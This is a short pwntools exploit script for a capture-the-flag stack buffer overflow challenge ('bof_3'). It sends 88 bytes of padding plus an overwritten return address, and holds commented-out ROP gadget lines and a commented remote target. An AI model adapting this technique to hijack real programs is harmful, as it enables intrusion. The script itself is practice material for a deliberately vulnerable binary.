from pwn import *

p = process('./bof_3')
#p = remote('dragonsec.si',40003)
pid =gdb.attach(p,gdbscript="""
	b * vuln+44
	b * main
	b * vuln
""")
pad = 88 * 'A'
win_addr = p64(0x0000000000400647)
ret = p64(0x00000000004004fe)
pop_rdi_ret = p64(0x0000000000400783)
pop_rsi_r15_ret = p64(0x0000000000400781)

payload = pad
payload += p64(0x0000000000400692)
#payload += p64(0xdeadbeef)
#payload += pop_rsi_r15_ret
#payload += p64(0x1337c0de)
#payload += p64(0x0)
#payload += ret
#payload += win_addr


p.sendlineafter('...\n',payload)
p.recvline()
#p.interactive()
